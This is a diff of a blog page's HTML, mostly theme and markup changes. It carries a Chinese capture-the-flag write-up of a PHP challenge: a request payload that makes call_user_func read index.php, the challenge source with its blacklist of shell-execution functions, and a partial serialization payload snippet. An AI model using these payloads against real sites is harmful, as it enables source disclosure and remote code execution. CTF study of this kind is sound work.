@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -247,11 +255,11 @@
             <div class="markdown-body">
               <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>[网鼎杯 2020 朱雀组]phpweb<img src="https://ftp.bmp.ovh/imgs/2021/02/fc3331b9a95a064c.png" srcset="/img/loading.gif">        </p>
 <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一段报错信息      </p>
-<div class="hljs"><pre><code>Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
-2021-02-27 06:14:05 am        </code></pre></div>
+<pre><code>Warning: date(): It is not safe to rely on the system&#39;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#39;UTC&#39; for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24
+2021-02-27 06:14:05 am        </code></pre>
 <p>而且没五秒页面会刷新一次  </p>
 <p>抓包看看<img src="https://ftp.bmp.ovh/imgs/2021/02/0efeb58411f3be9b.png" srcset="/img/loading.gif"><br>前面一个date,后面是时间—–函数执行<br>读取<code>index.php</code><br><code>func=file_get_contents&amp;p=index.php</code>   </p>
-<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
     $disable_fun = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params">$func, $p</span>) </span>&#123;
         $result = call_user_func($func, $p);
@@ -279,9 +287,9 @@
         &#125;<span class="hljs-keyword">else</span> &#123;
             <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);
         &#125;
-    &#125;</code></pre></div></code></pre>
+    &#125;</code></pre></code></pre>
 <p>可以看到禁了很多函数<br>有个class<br>可以用反序列<code>unserialize</code>函数      </p>
-<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><div class="hljs"><pre><code>```php
+<h2 id="解"><a href="#解" class="headerlink" title="解"></a>解</h2><pre><code>```php
 &lt;?php
 
 class Test &#123;
@@ -293,7 +301,7 @@ class Test &#123;
 $a=new Test();
 $b=serialize($a);
 echo $b;       
-```    </code></pre></div>
+```    </code></pre>
 <h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
 <li>序列化</li>
 <li><code>call_user_func</code>       <blockquote>
@@ -445,6 +453,8 @@ echo $b;
 
 
 
+  
+    
   
 
 
